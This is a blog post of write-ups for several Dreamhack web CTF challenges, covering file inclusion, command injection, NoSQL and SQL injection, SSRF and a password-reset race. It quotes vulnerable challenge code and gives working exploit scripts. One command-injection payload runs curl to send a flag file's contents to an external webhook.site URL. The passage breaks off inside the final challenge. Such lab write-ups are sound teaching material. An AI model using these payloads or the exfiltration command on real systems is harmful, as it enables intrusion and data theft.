---
title: Dreamhack (4)
published: 2025-01-04
category: Writeups
tags: [web, dh, dreamhack, ctf]
image: "./image/titles/dreamhack.png"
description: Some cool and fun web challenges from dreamhack.
draft: false
---

# Web Hacking

## Base64 based

[Challenge](https://dreamhack.io/wargame/challenges/1785)
[Source](https://sfo2.digitaloceanspaces.com/wargame1/public/1c46a8f7-ab98-417f-ad04-91ba106c4f68.zip?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=OIK4A6AORYFTHBTQUV55%2F20250406%2Fsfo2%2Fs3%2Faws4_request&X-Amz-Date=20250406T070230Z&X-Amz-Expires=86400&X-Amz-SignedHeaders=host&X-Amz-Signature=00658793d81678c9c713e3da93d916ca47a8f1f5e8aefb7073ee100555cc06c1)

`index.php`

```php
<?php
        
    define('ALLOW_INCLUDE', true);

    if (isset($_GET['file'])) {
        $encodedFileName = $_GET['file'];
        if (stripos($encodedFileName, "Li4v") !== false){
            echo "<p class='error'>Error: Not allowed ../.</p>";
            exit(0);
        }
        if ((stripos($encodedFileName, "ZmxhZ") !== false) || (stripos($encodedFileName, "aHA=") !== false)){
            echo "<p class='error'>Error: Not allowed flag.</p>";
            exit(0);
        }
        $decodedFileName = base64_decode($encodedFileName);

        $filePath = __DIR__ . DIRECTORY_SEPARATOR . $decodedFileName;

        if ($decodedFileName && file_exists($filePath) && strpos(realpath($filePath),__DIR__) == 0) {
            echo "<p>Including file: <strong>$decodedFileName</strong></p>";
            echo "<div>";
            require_once($decodedFileName);
            echo "</div>";
        } else {
            echo "<p class='error'>Error: Invalid file or file does not exist.</p>";
        }
    } else {
        echo "<p class='error'>No file parameter provided.</p>";
    }
?>
```

The code checks the input content passed into the `file` variable. If the string `Li4v` appears in file, it returns `Error: Not allowed ../`, meaning the `../` characters are not allowed. Furthermore, if it contains `ZmxhZ` or `aHA=`, which correspond to `flag` or `hp`, the result is also rejected. Here, we notice that the remaining lines of code check whether the file is located in the current directory — meaning only `flag.php` can be read. To get the `flag`, we can add `./` to bypass all these checks and meet the condition of being in the correct directory.

![image](./image/dreamhack/30.png)

![image](./image/dreamhack/31.png)

`flag is DH{We1c0me_t0_Ba5e64:OYlZXdCdyIJqcslw/mo2Wg==}`

---

## Pearfect Markdown

[Challenge](https://dreamhack.io/wargame/challenges/1773)
[Source](https://sfo2.digitaloceanspaces.com/wargame1/public/d6fa1fc5-e3db-41be-807d-22d5137276d8.zip?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=OIK4A6AORYFTHBTQUV55%2F20250406%2Fsfo2%2Fs3%2Faws4_request&X-Amz-Date=20250406T134615Z&X-Amz-Expires=86400&X-Amz-SignedHeaders=host&X-Amz-Signature=051cf2cf52d1d34840b2c6bb0ddfc99b7630ef871769281696353cd69fe24bcd)

`post_handler.php`

```php
<?php
    $uploads_dir = 'uploads/';

        if ($_SERVER['REQUEST_METHOD'] === 'GET') {

            $file = $_GET['file'] ?? 'example.md';
            $path = $uploads_dir . $file; 

            include($path);

        } else {
            echo "Use GET method!!";
        }
?>
```

In this challenge, the `vulnerability` lies in the include function in `PHP`. This function `executes` the content of the file it is directed to, so we just need to modify the content of `example.md` or add a new file containing code to achieve `RCE`.

![image](./image/dreamhack/32.png)

![image](./image/dreamhack/33.png)

![image](./image/dreamhack/34.png)

![image](./image/dreamhack/35.png)

`flag is DH{9a2a75682b662e873797cd3ccdd6b22fb166d43f2dddc6e57de9a6c0effc9307}`

---

## Simple Note Manager

[Challenge](https://dreamhack.io/wargame/challenges/1751)
[Source](https://sfo2.digitaloceanspaces.com/wargame1/public/33b87a13-54ae-47a6-b859-f3e03c94838a.zip?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=OIK4A6AORYFTHBTQUV55%2F20250406%2Fsfo2%2Fs3%2Faws4_request&X-Amz-Date=20250406T191403Z&X-Amz-Expires=86400&X-Amz-SignedHeaders=host&X-Amz-Signature=53599979ef9e9aa60fdb8fdf4457f8200db8dcbe93afc89cddc2a3247b3655cc)


A challenge with create note, delete, update and backup functionality, in which I found a `command injection vulnerability` in the post method backup

```python
#!/usr/bin/env python3
import subprocess
import threading
import time
from flask import Flask, make_response, redirect, request, abort, render_template, url_for

app = Flask(__name__)

lock = threading.Lock()
new_note_id = 0
notes = {}

def create_note(content):
    global new_note_id
    with lock:
        note_id = new_note_id
        new_note_id += 1
        notes[note_id] = content
        return notes[note_id]

def read_note(note_id):
    with lock:
        return notes[note_id]

def update_note(note_id, content):
    with lock:
        notes[note_id] = content
        return notes[note_id]

def delete_note(note_id):
    with lock:
        del notes[note_id]

def backup_notes(timestamp):
    with lock:
        with open('./tmp/notes.tmp', 'w') as f:
            f.write(repr(notes))
        subprocess.Popen(f'cp ./tmp/notes.tmp /tmp/{timestamp}', shell=True)


@app.route('/', methods=['GET'])
def get_index():
    return render_template('notes.html', notes=notes)


@app.route('/notes', methods=['GET'])
def get_notes():
    return render_template('notes.html', notes=notes)


@app.route('/create_note', methods=['GET'])
def get_create_note():
    return render_template('create_note.html')


@app.route('/create_note', methods=['POST'])
def post_create_note():
    content = request.form.get('content')
    if not isinstance(content, str):
        abort(400)
    create_note(content)
    return redirect(url_for('get_index'))


@app.route('/update_note', methods=['GET'])
def post_update_note():
    if len(notes) == 0:
        abort(404)
    return render_template('update_note.html')


@app.route('/update_note', methods=['POST'])
def get_update_note():
    note_id = request.form.get('note_id')
    if not isinstance(note_id, str) or not note_id.isdigit():
        abort(400)
    note_id = int(note_id)
    if note_id not in notes:
        abort(404)
    content = request.form.get('content')
    if not isinstance(content, str):
        abort(400)
    update_note(note_id, content)
    return redirect(url_for('get_index'))


@app.route('/delete_note', methods=['GET'])
def get_delete_note():
    if len(notes) == 0:
        abort(404)
    return render_template('delete_note.html')


@app.route('/delete_note', methods=['POST'])
def post_delete_note():
    note_id = request.form.get('note_id')
    if not isinstance(note_id, str) or not note_id.isdigit():
        abort(400)
    note_id = int(note_id)
    if note_id not in notes:
        abort(404)
    delete_note(note_id)
    return redirect(url_for('get_index'))


@app.route('/backup_notes', methods=['GET'])
def get_backup_notes():
    print(len(notes), flush=True)
    if len(notes) == 0:
        abort(404)
    page = render_template('backup_notes.html')
    resp = make_response(page)
    resp.set_cookie('backup-timestamp', f'{time.time()}')
    return resp


@app.route('/backup_notes', methods=['POST'])
def post_backup_notes():
    if len(notes) == 0:
        abort(404)
    backup_timestamp = request.cookies.get('backup-timestamp', f'{time.time()}')
    if not isinstance(backup_timestamp, str):
        abort(400)
    backup_notes(backup_timestamp)
    return redirect(url_for('get_index'))
```

Accordingly, when you create a note and back it up, the content of `./tmp/notes.tmp` will be saved to `./tmp/timestamp` with the `timestamp` assigned in the `cookie`.

```python
def backup_notes(timestamp):
    with lock:
        with open('./tmp/notes.tmp', 'w') as f:
            f.write(repr(notes))
        subprocess.Popen(f'cp ./tmp/notes.tmp /tmp/{timestamp}', shell=True)
```

In this way I have combined the command with `&&` . But there is one thing we will not be able to view the content in the usual way so we will `RCE` and use `webhook` to receive the return information

![image](./image/dreamhack/36.png)

![image](./image/dreamhack/37.png)

![image](./image/dreamhack/38.png)

and in the code I see the `flag` is at the same level as `app.py` so just cat it out

![image](./image/dreamhack/39.png)

![image](./image/dreamhack/40.png)

`Flag: DH{e062dd285757423f72812daa0fbe42c4e2a85bfad1d46f91de490cbbaa35d679}`

---

## Logical

[Challenge](https://dreamhack.io/wargame/challenges/1744)
[Source](https://sfo2.digitaloceanspaces.com/wargame1/public/45cb65c3-3df6-441e-9d79-5326982114ea.zip?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=OIK4A6AORYFTHBTQUV55%2F20250522%2Fsfo2%2Fs3%2Faws4_request&X-Amz-Date=20250522T234138Z&X-Amz-Expires=86400&X-Amz-SignedHeaders=host&X-Amz-Signature=067504aaf273bfa9f45cc41d6362357fe5c873097a35545bb5ea734eab52c414)


`database_setup.py`

```python
#Database setup for the challenge
import sqlite3


connection = sqlite3.connect("logical.db")
cursor = connection.cursor()

query = """CREATE TABLE IF NOT EXISTS users(uname TEXT, password TEXT)"""

cursor.execute(query)
```

`app.py`

```python
from flask import Flask, render_template, redirect, request, make_response
from random import randint
from hashlib import md5
from sqlite3 import connect

app = Flask(__name__)
hidden_dir = '/dir_' + str(randint(1, 99999999999999999))


@app.route('/', methods=['GET','POST'])
def login():
    if request.method == 'GET':
        return render_template('login.html')
    elif request.method == 'POST':
        if not login_check():
            return render_template('login.html', error='Something wrong with the login details. Try again.')
        else:
            return redirect(hidden_dir)
    else:
        return make_response(405)

@app.route(hidden_dir)
def hidden_endpoint():
    return render_template('hidden.html', FLAG=open('flag.txt').read())

def login_check():
    uname = request.form.get('uname', '')
    password = request.form.get('password', '')
    if not uname and not password:
        return False
    connection = connect("logical.db")
    cursor = connection.cursor()
    query = ("SELECT uname, password FROM users WHERE password = '{}'").format(md5(password.encode()).hexdigest())
    usrname = cursor.execute(query).fetchall()
    name = usrname[0][0] if usrname and usrname[0] and usrname[0][0] else ''
    return name == uname


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80, debug=False)
```

In this challenge, we can see that there will be a randomly generated path, and by successfully logging in, we will be able to access it and retrieve the `FLAG`. We will check the `login_check()` function: 

```python
def login_check():
    uname = request.form.get('uname', '')
    password = request.form.get('password', '')
    if not uname and not password:
        return False
    connection = connect("logical.db")
    cursor = connection.cursor()
    query = ("SELECT uname, password FROM users WHERE password = '{}'").format(md5(password.encode()).hexdigest())
    usrname = cursor.execute(query).fetchall()
    name = usrname[0][0] if usrname and usrname[0] and usrname[0][0] else ''
    return name == uname
```

* The program will require entering `uname` and `password`, and will return `False` if both are `empty`.
* Then it will connect to the `database` to retrieve `user` information through a `query` with the password as a `hash`.
* However, all information is still saved in usrname. It will then be saved in the variable `name` if `usrname`, `usrname[0]`, and `usrname[0][0]` all exist, and if they do not exist, it will return `empty`.

**Solution:**
Let's take a look back; when we start the session, everything runs from the beginning and no user is added to the `database`, so our approach is to leave the `uname` field `empty` because the `password` field must be present to pass the `first condition`. When `uname` is `empty`, it will be `compared` with `name`, but there is nothing in the `database` so the program will execute the else block, returning an empty string.

![image](./image/dreamhack/41.png)

![image](./image/dreamhack/42.png)

![image](./image/dreamhack/43.png)

`flag: dreamhack{85f9d023b5c7f7a8a47422aebd3cf00c}`

---

## Mango 

[Challenge](https://dreamhack.io/wargame/challenges/90)
[Source](https://sfo2.digitaloceanspaces.com/wargame1/public/9ceed629-1183-4107-85e0-67c531e9196e.zip?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=OIK4A6AORYFTHBTQUV55%2F20250529%2Fsfo2%2Fs3%2Faws4_request&X-Amz-Date=20250529T074516Z&X-Amz-Expires=86400&X-Amz-SignedHeaders=host&X-Amz-Signature=10f8ed5f537ac537f92c421ff7f19ea40af670fd7112e46cd4cf5043d129ad8d)

`main.js`

```javascript
const express = require('express');
const app = express();

const mongoose = require('mongoose');
mongoose.connect('mongodb://localhost/main', { useNewUrlParser: true, useUnifiedTopology: true });
const db = mongoose.connection;

// flag is in db, {'uid': 'admin', 'upw': 'DH{32alphanumeric}'}
const BAN = ['admin', 'dh', 'admi'];

filter = function(data){
    const dump = JSON.stringify(data).toLowerCase();
    var flag = false;
    BAN.forEach(function(word){
        if(dump.indexOf(word)!=-1) flag = true;
    });
    return flag;
}

app.get('/login', function(req, res) {
    if(filter(req.query)){
        res.send('filter');
        return;
    }
    const {uid, upw} = req.query;

    db.collection('user').findOne({
        'uid': uid,
        'upw': upw,
    }, function(err, result){
        if (err){
            res.send('err');
        }else if(result){
            res.send(result['uid']);
        }else{
            res.send('undefined');
        }
    })
});

app.get('/', function(req, res) {
    res.send('/login?uid=guest&upw=guest');
});

app.listen(8000, '0.0.0.0');
```

In this challenge, we need to log in, and the parameters will be `filtered` for words related to `BAN`; therefore, this is a `NoSQL vulnerability`. Accordingly, if the login is successful, it will return the `uid`. So far, I have exploited this by manipulating `uid=*`, while I will `brute-force` the variable `upw` based on the format of upw being `DH{32alphanumeric}`. Let's take a look at the format..

![image](./image/dreamhack/44.png)

Accordingly, characters starting with `D` will return `admin` because it `matches` the format. But if it starts with `DH`, it will be incorrect because they are blocked by the `filter` which does not distinguish between uppercase or lowercase letters.

![image](./image/dreamhack/45.png)

So far I have used regex to verify that each character is alphanumeric by using `.{2}` to symbolize the `length as 2` for the `first 2 characters`, followed by `{`, then `{32}` indicates a `length of 32 for 32 alphanumeric characters`, and the remaining is `}`. Let's take a look.

![image](./image/dreamhack/46.png)

the results are completely correct and return to `admin`. Next, we will bruteforce each character inside `{}` freely since only `dh` and `admin` are filtered.

`exploit.py`

```python
import requests
import string

URL = "http://host3.dreamhack.games:14621/login?uid[$ne]=*&upw[$regex]="

pw = ".{2}{"

# res = requests.get(URL+upw)
known = ""
charset = string.ascii_lowercase + string.digits
for i in range(32):
    for c in charset:
        tmp = known + c
        res = requests.get(URL + pw + tmp + ".{" + str(32-i) + "}")

        if "admin" in res.text:
            print(f"Found {c}")
            known = tmp
            break

        print(f"trying {c}")

print("DH{" + known + "}")
# print(res.text)
```

![image](./image/dreamhack/47.png)

The function of the script is to find each character by position and the number of remaining characters, which is stored in the variable `known`.

`flag: DH{89e50fa6fafe2604e33c0ba05843d3df}`

---

## web-ssrf

[Challenge](https://dreamhack.io/wargame/challenges/75)
[Source](https://sfo2.digitaloceanspaces.com/wargame1/public/3b9a330b-4baf-45c7-8201-76f5ae4c3d8d.zip?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=OIK4A6AORYFTHBTQUV55%2F20250529%2Fsfo2%2Fs3%2Faws4_request&X-Amz-Date=20250529T185817Z&X-Amz-Expires=86400&X-Amz-SignedHeaders=host&X-Amz-Signature=6b91f25d39e96c1bc1b575c8deee7aa3b83a606a37565494da4325266567fb7b)

In this challenge, `local URLs` are filtered and cannot be used, so I converted them to `hex` to test and it succeeded at port `8000`.

![image](./image/dreamhack/48.png)

![image](./image/dreamhack/49.png)

Next, we can `brute-force` the local port using `Burp Suite` or a script `python`.

* **BurpSuite** 

![image](./image/dreamhack/50.png)

If the port is correct, it will return a length different from the other ports, so we just need to wait to find it.

![image](./image/dreamhack/51.png)

and found port is 1564

* **scritp python**

`script.py`

```python
import requests

url_local = "0x7F000001"

url_chall = "http://host3.dreamhack.games:15508/img_viewer"


data = f"http://{url_local}:8000/static/dream.png"
res = requests.post(url_chall,data={"url":data})

for i in range(1500,1801):
    data_tmp = f"http://{url_local}:{i}/static/dream.png"

    res_tmp = requests.post(url_chall,data={"url":data_tmp})
    if len(res.text) == len(res_tmp.text):
        print(f"Found port : {i}")
        break

    print(f"Trying {i}")
```

![image](./image/dreamhack/52.png)

and finally heading towards `flag.txt`

![image](./image/dreamhack/53.png)

![image](./image/dreamhack/54.png)

![image](./image/dreamhack/55.png)

`flag: DH{43dd2189056475a7f3bd11456a17ad71}`

---

## blind-command

[Challenge](https://dreamhack.io/wargame/challenges/73)
[Source](https://sfo2.digitaloceanspaces.com/wargame1/public/3251dc61-26b7-4bb0-90d5-974e99815dd9.zip?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=OIK4A6AORYFTHBTQUV55%2F20250529%2Fsfo2%2Fs3%2Faws4_request&X-Amz-Date=20250529T195609Z&X-Amz-Expires=86400&X-Amz-SignedHeaders=host&X-Amz-Signature=32dbb963a3111ebde210fd70a7b21a59e5c07f4148c5b4918331bc61fdb74cc9)

`app.py`

```python
#!/usr/bin/env python3
from flask import Flask, request
import os

app = Flask(__name__)

@app.route('/' , methods=['GET'])
def index():
    cmd = request.args.get('cmd', '')
    if not cmd:
        return "?cmd=[cmd]"

    if request.method == 'GET':
        ''
    else:
        os.system(cmd)
    return cmd

app.run(host='0.0.0.0', port=8000)
```

In this challenge we can `RCE` through `else` block, but there is a big point that the default website is `GET` but if it is `GET` then `nothing`, return `empty`. Accordingly I tried with `POST` method and got the return headers including: Allow: GET, OPTIONS, HEAD

![image](./image/dreamhack/56.png)

I tried with `OPTIONS` and `HEAD` then `HEAD` can help us enter `else` block and execute source code

![image](./image/dreamhack/57.png)

![image](./image/dreamhack/58.png)


`final payload`

```shell
HEAD /?cmd=curl+-X+POST+'https%3a//webhook.site/9ffb1d8c-8fcf-49af-a8bf-e01bfce30730'+-d+"$(cat+flag.py)" HTTP/1.1
Host: host3.dreamhack.games:13999
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
```

![image](./image/dreamhack/59.png)

![image](./image/dreamhack/60.png)

`flag: DH{4c9905b5abb9c3eb10af4ab7e1645c23}`

---

## funjs

[Challenge](https://dreamhack.io/wargame/challenges/116)
[Source](https://sfo2.digitaloceanspaces.com/wargame1/public/b79ef087-396c-4f01-93d4-4cc792f69177.zip?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=OIK4A6AORYFTHBTQUV55%2F20250529%2Fsfo2%2Fs3%2Faws4_request&X-Amz-Date=20250529T141143Z&X-Amz-Expires=86400&X-Amz-SignedHeaders=host&X-Amz-Signature=704b9bc89729bd881edaa07ffb9499502045a2ac279a274530dde60d3f8d71d2)

`index.html`

```html
<html>
    <head>
    <style>*{margin: 0;}</style>
    <script>
    var box;
    window.onload = init;
    function init() {
      box = document.getElementById("formbox");
      setInterval(moveBox,1000);
    }
    function moveBox() {
        box.posX = Math.random() * (window.innerWidth - 64); 
        box.posY = Math.random() * (document.documentElement.scrollHeight - 64); 
        box.style.marginLeft = box.posX + "px";
        box.style.marginTop  = box.posY + "px";
        debugger;
    }

    function text2img(text){
        var imglist = box.getElementsByTagName('img');
        while(imglist.length > 0) {imglist[0].remove();}
        var canvas = document.createElement("canvas");
        canvas.width = 620;
        canvas.height = 80;
        var ctx = canvas.getContext('2d');
        ctx.font = "30px Arial";
        var text = text;
        ctx.fillText(text,10,50);
        var img = document.createElement("img");
        img.src = canvas.toDataURL();
        box.append(img);
    };

    function main(){
        var _0x1046=['2XStRDS','1388249ruyIdZ','length','23461saqTxt','9966Ahatiq','1824773xMtSgK','1918853csBQfH','175TzWLTY','flag','getElementById','94hQzdTH','NOP\x20!','11sVVyAj','37594TRDRWW','charCodeAt','296569AQCpHt','fromCharCode','1aqTvAU'];
        var _0x376c = function(_0xed94a5, _0xba8f0f) {
            _0xed94a5 = _0xed94a5 - 0x175;
            var _0x1046bc = _0x1046[_0xed94a5];
            return _0x1046bc;
        };
        var _0x374fd6 = _0x376c;
        (function(_0x24638d, _0x413a92) {
            var _0x138062 = _0x376c;
            while (!![]) {
                try {
                    var _0x41a76b = -parseInt(_0x138062(0x17f)) + parseInt(_0x138062(0x180)) * -parseInt(_0x138062(0x179)) + -parseInt(_0x138062(0x181)) * -parseInt(_0x138062(0x17e)) + -parseInt(_0x138062(0x17b)) + -parseInt(_0x138062(0x177)) * -parseInt(_0x138062(0x17a)) + -parseInt(_0x138062(0x17d)) * -parseInt(_0x138062(0x186)) + -parseInt(_0x138062(0x175)) * -parseInt(_0x138062(0x184));
                    if (_0x41a76b === _0x413a92) break;
                    else _0x24638d['push'](_0x24638d['shift']());
                } catch (_0x114389) {
                    _0x24638d['push'](_0x24638d['shift']());
                }
            }
        }(_0x1046, 0xf3764));
        var flag = document[_0x374fd6(0x183)](_0x374fd6(0x182))['value'],
            _0x4949 = [0x20, 0x5e, 0x7b, 0xd2, 0x59, 0xb1, 0x34, 0x72, 0x1b, 0x69, 0x61, 0x3c, 0x11, 0x35, 0x65, 0x80, 0x9, 0x9d, 0x9, 0x3d, 0x22, 0x7b, 0x1, 0x9d, 0x59, 0xaa, 0x2, 0x6a, 0x53, 0xa7, 0xb, 0xcd, 0x25, 0xdf, 0x1, 0x9c],
            _0x42931 = [0x24, 0x16, 0x1, 0xb1, 0xd, 0x4d, 0x1, 0x13, 0x1c, 0x32, 0x1, 0xc, 0x20, 0x2, 0x1, 0xe1, 0x2d, 0x6c, 0x6, 0x59, 0x11, 0x17, 0x35, 0xfe, 0xa, 0x7a, 0x32, 0xe, 0x13, 0x6f, 0x5, 0xae, 0xc, 0x7a, 0x61, 0xe1],
            operator = [(_0x3a6862, _0x4b2b8f) => {
                return _0x3a6862 + _0x4b2b8f;
            }, (_0xa50264, _0x1fa25c) => {
                return _0xa50264 - _0x1fa25c;
            }, (_0x3d7732, _0x48e1e0) => {
                return _0x3d7732 * _0x48e1e0;
            }, (_0x32aa3b, _0x53e3ec) => {
                return _0x32aa3b ^ _0x53e3ec;
            }],
            getchar = String[_0x374fd6(0x178)];
        if (flag[_0x374fd6(0x17c)] != 0x24) {
            text2img(_0x374fd6(0x185));
            return;
        }
        for (var i = 0x0; i < flag[_0x374fd6(0x17c)]; i++) {
            if (flag[_0x374fd6(0x176)](i) == operator[i % operator[_0x374fd6(0x17c)]](_0x4949[i], _0x42931[i])) {} else {
                text2img(_0x374fd6(0x185));
                return;
            }
        }
        text2img(flag);
    }
    </script>
    </head>
    <body>3
        <div id='formbox'>
            <h2>Find FLAG !</h2>
            <input type='flag' id='flag' value=''>
            <input type='button' value='submit' onclick='main()'>
        </div>
    </body>
</html>
```

The JavaScript code performs verification of a `flag` string entered by the user, with the following mechanism:

* Check `flag.length == 36`
* Iterate through each character of `flag[i]`, compare:
`flag.charCodeAt(i) == operator[i % 4](A[i], B[i])`

- The operations are rotated according to the index `i % 4`:
- 0 → `+`
- 1 → `-`
- 2 → `*`
- 3 → `^` (xor)

- If all characters are correct, the program displays `flag` as an image using `canvas`. If false, display the string `"NOP !"`.

`script.py`

```python
data1 = [32, 94, 123, 210, 89, 177, 52, 114, 27, 105, 97, 60, 17, 53, 101, 128, 9, 157, 9, 61, 34, 123, 1, 157, 89, 170, 2, 106, 83, 167, 11, 205, 37, 223, 1, 156]
data2 = [36, 22, 1, 177, 13, 77, 1, 19, 28, 50, 1, 12, 32, 2, 1, 225, 45, 108, 6, 89, 17, 23, 53, 254, 10, 122, 50, 14, 19, 111, 5, 174, 12, 122, 97, 225]

flag = ""

for i in range(36):
    op = i % 4
    a = data1[i]
    b = data2[i]

    if op == 0:
        c = a + b
    elif op == 1:
        c = a - b
    elif op == 2:
        c = a * b
    elif op == 3:
        c = a ^ b

    flag += chr(c)

print(f"[+] Flag: {flag}")
```

![image](./image/dreamhack/61.png)

`flag: DH{cfd4a77a013ea616d3d5cc0ddf87c1ea}`

---

## login-1

[Challenge](https://dreamhack.io/wargame/challenges/47)
[Source](https://sfo2.digitaloceanspaces.com/wargame1/public/82db1164-2cef-42c3-8494-f4ca0d5c0cae.zip?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=OIK4A6AORYFTHBTQUV55%2F20250529%2Fsfo2%2Fs3%2Faws4_request&X-Amz-Date=20250529T215035Z&X-Amz-Expires=86400&X-Amz-SignedHeaders=host&X-Amz-Signature=4ba0ca250217d39f2ec6449e4b5371b8f6eba3eed3f1a9d639481ee5f808debb)

`app.py`

```python
#!/usr/bin/python3
from flask import Flask, request, render_template, make_response, redirect, url_for, session, g
import sqlite3
import hashlib
import os
import time, random

app = Flask(__name__)
app.secret_key = os.urandom(32)

DATABASE = "database.db"

userLevel = {
    0 : 'guest',
    1 : 'admin'
}
MAXRESETCOUNT = 5

try:
    FLAG = open('./flag.txt', 'r').read()
except:
    FLAG = '[**FLAG**]'

def makeBackupcode():
    return random.randrange(100)

def get_db():
    db = getattr(g, '_database', None)
    if db is None:
        db = g._database = sqlite3.connect(DATABASE)
    db.row_factory = sqlite3.Row
    return db

@app.teardown_appcontext
def close_connection(exception):
    db = getattr(g, '_database', None)
    if db is not None:
        db.close()

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'GET':
        return render_template('login.html')
    else:
        userid = request.form.get("userid")
        password = request.form.get("password")

        conn = get_db()
        cur = conn.cursor()
        user = cur.execute('SELECT * FROM user WHERE id = ? and pw = ?', (userid, hashlib.sha256(password.encode()).hexdigest() )).fetchone()
        
        if user:
            session['idx'] = user['idx']
            session['userid'] = user['id']
            session['name'] = user['name']
            session['level'] = userLevel[user['level']]
            return redirect(url_for('index'))

        return "<script>alert('Wrong id/pw');history.back(-1);</script>";

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('index'))

@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'GET':
        return render_template('register.html')
    else:
        userid = request.form.get("userid")
        password = request.form.get("password")
        name = request.form.get("name")

        conn = get_db()
        cur = conn.cursor()
        user = cur.execute('SELECT * FROM user WHERE id = ?', (userid,)).fetchone()
        if user:
            return "<script>alert('Already Exists userid.');history.back(-1);</script>";

        backupCode = makeBackupcode()
        sql = "INSERT INTO user(id, pw, name, level, backupCode) VALUES (?, ?, ?, ?, ?)"
        cur.execute(sql, (userid, hashlib.sha256(password.encode()).hexdigest(), name, 0, backupCode))
        conn.commit()
        return render_template("index.html", msg=f"<b>Register Success.</b><br/>Your BackupCode : {backupCode}")

@app.route('/forgot_password', methods=['GET', 'POST'])
def forgot_password():
    if request.method == 'GET':
        return render_template('forgot.html')
    else:
        userid = request.form.get("userid")
        newpassword = request.form.get("newpassword")
        backupCode = request.form.get("backupCode", type=int)

        conn = get_db()
        cur = conn.cursor()
        user = cur.execute('SELECT * FROM user WHERE id = ?', (userid,)).fetchone()
        if user:
            # security for brute force Attack.
            time.sleep(1)

            if user['resetCount'] == MAXRESETCOUNT:
                return "<script>alert('reset Count Exceed.');history.back(-1);</script>"
            
            if user['backupCode'] == backupCode:
                newbackupCode = makeBackupcode()
                updateSQL = "UPDATE user set pw = ?, backupCode = ?, resetCount = 0 where idx = ?"
                cur.execute(updateSQL, (hashlib.sha256(newpassword.encode()).hexdigest(), newbackupCode, str(user['idx'])))
                msg = f"<b>Password Change Success.</b><br/>New BackupCode : {newbackupCode}"

            else:
                updateSQL = "UPDATE user set resetCount = resetCount+1 where idx = ?"
                cur.execute(updateSQL, (str(user['idx'])))
                msg = f"Wrong BackupCode !<br/><b>Left Count : </b> {(MAXRESETCOUNT-1)-user['resetCount']}"
            
            conn.commit()
            return render_template("index.html", msg=msg)

        return "<script>alert('User Not Found.');history.back(-1);</script>";


@app.route('/user/<int:useridx>')
def users(useridx):
    conn = get_db()
    cur = conn.cursor()
    user = cur.execute('SELECT * FROM user WHERE idx = ?;', [str(useridx)]).fetchone()
    
    if user:
        return render_template('user.html', user=user)

    return "<script>alert('User Not Found.');history.back(-1);</script>";

@app.route('/admin')
def admin():
    if session and (session['level'] == userLevel[1]):
        return FLAG

    return "Only Admin !"

app.run(host='0.0.0.0', port=8000)
```

In this challenge we are provided with a website with the function of `registration`, `login` and `forgot password` and `admin`, in which `admin` will contain the `flag` we need to find, to access `admin` we need `userLevel=1`, of course we cannot access like that, accordingly I tried to register first and received a `user/17` so I tried with `IDOR` to see how it goes

![image](./image/dreamhack/62.png)

![image](./image/dreamhack/63.png)

![image](./image/dreamhack/64.png)

![image](./image/dreamhack/65.png)

and more...

next look at the source code you will see that to be able to change the `password` you need the correct `userID`, and the correct `backupCode` to be able to update. we can find the `userID` through `IDOR`, the problem is the `backupCode` with only 5 maximum times for us to change and each time only in 1 second. Hmmmmm, why is it 1 second, so what if we send more, that is race condition. I tried bruteforce in burpsuite with `userID` is `lemon`.

![image](./image/dreamhack/66.png)

![image](./image/dreamhack/67.png)

Great, you have successfully updated your `password`. Next, we just need to log in with the new `userID` and `password`.

![image](./image/dreamhack/68.png)

![image](./image/dreamhack/69.png)

![image](./image/dreamhack/70.png)

`flag: DH{4b308b526834909157a73567075c9ab7}`

---

## sql injection bypass WAF Advanced

[Challenge](https://dreamhack.io/wargame/challenges/416)
[Source](https://sfo2.digitaloceanspaces.com/wargame1/public/c7ab79a2-e3e0-427a-a34c-2f237446304a.zip?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=OIK4A6AORYFTHBTQUV55%2F20250530%2Fsfo2%2Fs3%2Faws4_request&X-Amz-Date=20250530T111338Z&X-Amz-Expires=86400&X-Amz-SignedHeaders=host&X-Amz-Signature=422dae685daea88e46f448d4f6984efd00d45b33b16330f948b71ef9fd2403e4)

`init.sql`

```sql
CREATE DATABASE IF NOT EXISTS `users`;
GRANT ALL PRIVILEGES ON users.* TO 'dbuser'@'localhost' IDENTIFIED BY 'dbpass';

USE `users`;
CREATE TABLE user(
  idx int auto_increment primary key,
  uid varchar(128) not null,
  upw varchar(128) not null
);

INSERT INTO user(uid, upw) values('abcde', '12345');
INSERT INTO user(uid, upw) values('admin', 'DH{**FLAG**}');
INSERT INTO user(uid, upw) values('guest', 'guest');
INSERT INTO user(uid, upw) values('test', 'test');
INSERT INTO user(uid, upw) values('dream', 'hack');
FLUSH PRIVILEGES;
```

`app.py`

```python
import os
from flask import Flask, request
from flask_mysqldb import MySQL

app = Flask(__name__)
app.config['MYSQL_HOST'] = os.environ.get('MYSQL_HOST', 'localhost')
app.config['MYSQL_USER'] = os.environ.get('MYSQL_USER', 'user')
app.config['MYSQL_PASSWORD'] = os.environ.get('MYSQL_PASSWORD', 'pass')
app.config['MYSQL_DB'] = os.environ.get('MYSQL_DB', 'users')
mysql = MySQL(app)

template ='''
<pre style="font-size:200%">SELECT * FROM user WHERE uid='{uid}';</pre><hr/>
<pre>{result}</pre><hr/>
<form>
    <input tyupe='text' name='uid' placeholder='uid'>
    <input type='submit' value='submit'>
</form>
